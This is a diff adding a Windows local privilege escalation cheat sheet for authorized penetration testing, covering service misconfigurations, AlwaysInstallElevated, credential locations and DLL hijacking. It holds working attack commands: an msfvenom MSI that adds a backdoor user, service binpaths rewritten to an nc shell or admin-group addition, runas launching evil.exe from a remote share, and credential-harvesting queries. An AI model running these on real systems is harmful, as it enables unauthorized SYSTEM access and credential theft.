@@ -1,0 +1,311 @@
+---
+title: "Windows Local Privilege Escalation"
+description: "Comprehensive Windows local privilege escalation techniques: services, registry, credentials, DLL hijacking, AlwaysInstallElevated, and more"
+---
+
+## Overview
+
+Windows local privilege escalation (LPE) involves exploiting misconfigurations, weak permissions, vulnerable services, or stored credentials to elevate from a standard user to SYSTEM/Administrator. The best automated enumeration tool is [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS).
+
+<Warning>
+This content is for authorized penetration testing only. Never test systems you do not have explicit written permission to assess.
+</Warning>
+
+## System Information Enumeration
+
+<Steps>
+  <Step title="OS Version and Patches">
+    ```bash
+    systeminfo
+    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+    wmic qfe get Caption,Description,HotFixID,InstalledOn
+    wmic os get osarchitecture
+    ```
+
+    PowerShell:
+    ```powershell
+    [System.Environment]::OSVersion.Version
+    Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
+    Get-Hotfix -description "Security update"
+    ```
+  </Step>
+
+  <Step title="Environment Variables">
+    ```bash
+    set
+    dir env:
+    Get-ChildItem Env: | ft Key,Value -AutoSize
+    ```
+  </Step>
+
+  <Step title="PowerShell History and Transcripts">
+    ```bash
+    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+    cat (Get-PSReadlineOption).HistorySavePath
+    cat (Get-PSReadlineOption).HistorySavePath | sls passw
+
+    # Check transcript registry keys
+    reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+    reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
+    ```
+  </Step>
+
+  <Step title="Drives and Shares">
+    ```bash
+    wmic logicaldisk get caption || fsutil fsinfo drives
+    Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}
+    ```
+  </Step>
+</Steps>
+
+## WSUS Exploitation
+
+If Windows Update uses HTTP instead of HTTPS:
+
+```bash
+reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
+# or PowerShell:
+Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
+```
+
+If the value starts with `http://` and `UseWUServer=1`, inject fake updates using [Wsuxploit](https://github.com/pimps/wsuxploit) or [pyWSUS](https://github.com/GoSecure/pywsus).
+
+## AlwaysInstallElevated
+
+If both registry keys are set to `0x1`, any user can install MSIs as SYSTEM:
+
+```bash
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+Exploit:
+```bash
+msfvenom -p windows/adduser USER=backdoor PASS=P@ssword123! -f msi -o alwe.msi
+msiexec /quiet /qn /i C:\Users\Public\alwe.msi
+```
+
+## Service Exploitation
+
+<AccordionGroup>
+  <Accordion title="Enumerate Services">
+    ```bash
+    net start
+    wmic service list brief
+    sc query
+    Get-Service
+    ```
+  </Accordion>
+
+  <Accordion title="Weak Service Permissions">
+    ```bash
+    # Check service permissions with accesschk
+    accesschk.exe -ucqv <Service_Name>
+    accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+    accesschk.exe -uwcqv %USERNAME% * /accepteula
+
+    # Modify a service binary path if you have SERVICE_CHANGE_CONFIG
+    sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+    sc config <Service_Name> binpath= "net localgroup administrators username /add"
+    ```
+
+    Key permissions that allow binary path modification:
+    - `SERVICE_CHANGE_CONFIG`
+    - `WRITE_DAC`
+    - `WRITE_OWNER`
+    - `GENERIC_WRITE` / `GENERIC_ALL`
+  </Accordion>
+
+  <Accordion title="Unquoted Service Paths">
+    Windows resolves unquoted paths with spaces by trying each partial path:
+
+    ```
+    C:\Program Files\Some Folder\Service.exe
+    → tries: C:\Program.exe
+    → tries: C:\Program Files\Some.exe
+    → tries: C:\Program Files\Some Folder\Service.exe
+    ```
+
+    Find unquoted service paths:
+    ```bash
+    wmic service get name,pathname,displayname,startmode \
+      | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '"'
+
+    # PowerShell (PowerUp)
+    Get-ServiceUnquoted -Verbose
+    ```
+  </Accordion>
+
+  <Accordion title="Service Registry Permissions">
+    ```bash
+    reg query hklm\System\CurrentControlSet\Services /s /v imagepath
+
+    get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * \
+      | findstr /i "<Username> Users Path Everyone"
+    ```
+
+    If writable, change the binary path:
+    ```bash
+    reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath \
+      /t REG_EXPAND_SZ /d C:\path\to\payload.exe /f
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## User and Group Enumeration
+
+```bash
+# CMD
+net users %username%
+net users
+net localgroup
+net localgroup Administrators
+whoami /all
+
+# PowerShell
+Get-WmiObject -Class Win32_UserAccount
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+```
+
+## Running Processes Analysis
+
+```bash
+Tasklist /SVC
+tasklist /v /fi "username eq system"
+
+# Check for process binary write permissions
+Get-WmiObject -Query "Select * from Win32_Process" \
+  | where {$_.Name -notlike "svchost*"} \
+  | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}}
+```
+
+Check binary permissions of running processes:
+```bash
+for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
+  for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
+    icacls "%%z" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%"
+  )
+)
+```
+
+## Windows Credentials
+
+<AccordionGroup>
+  <Accordion title="Winlogon Auto-Login Credentials">
+    ```bash
+    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul \
+      | findstr /i "DefaultDomainName DefaultUserName DefaultPassword"
+    ```
+  </Accordion>
+
+  <Accordion title="Credential Manager">
+    ```bash
+    cmdkey /list
+    # Use saved credentials
+    runas /savecred /user:WORKGROUP\Administrator "\\10.x.x.x\SHARE\evil.exe"
+    ```
+  </Accordion>
+
+  <Accordion title="DPAPI Master Keys">
+    ```bash
+    Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+    Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect\
+
+    # Decrypt with mimikatz
+    # dpapi::masterkey /pvk or /rpc
+    ```
+  </Accordion>
+
+  <Accordion title="WiFi Passwords">
+    ```bash
+    netsh wlan show profile
+    netsh wlan show profile <SSID> key=clear
+    ```
+  </Accordion>
+
+  <Accordion title="Unattended Installation Files">
+    ```
+    C:\Windows\Panther\Unattended.xml
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\System32\Sysprep\unattend.xml
+    dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml 2>nul
+    ```
+  </Accordion>
+
+  <Accordion title="Sticky Notes Database">
+    ```
+    C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Network Information
+
+```bash
+# Interfaces
+ipconfig /all
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+
+# Open ports
+netstat -ano
+
+# Shares
+net view
+net view /all /domain [domainname]
+net share
+
+# Routing
+route print
+
+# ARP
+arp -A
+```
+
+## KrbRelayUp (Domain LPE)
+
+Requires: LDAP signing not enforced + users can configure RBCD + users can create computers (all default settings).
+
+```bash
+# https://github.com/Dec0ne/KrbRelayUp
+KrbRelayUp.exe relay -d <domain> -cn <computername>
+```
+
+## Antivirus / Security Controls Enumeration
+
+```bash
+# Audit settings
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+
+# LAPS — local admin password management
+reg query "HKLM\Software\Policies\Microsoft\Services\AdmPwd" /v AdmPwdEnabled
+
+# WDigest — if enabled, cleartext passwords in LSASS
+reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
+
+# LSA Protection
+reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
+
+# Credential Guard
+reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
+```
+
+## PATH DLL Hijacking
+
+If you have write permissions inside a PATH folder:
+
+```bash
+for %%A in ("%path:;=";"%") do (
+  cmd.exe /c icacls "%%~A" 2>nul \
+    | findstr /i "(F) (M) (W) :\\" \
+    | findstr /i ":\\ everyone authenticated users todos %username%"
+)
+```
+
+## References
+
+- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+- [GTFOBins Windows equivalent — LOLBAS](https://lolbas-project.github.io/)
+- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+- [Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
+- [accesschk — Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
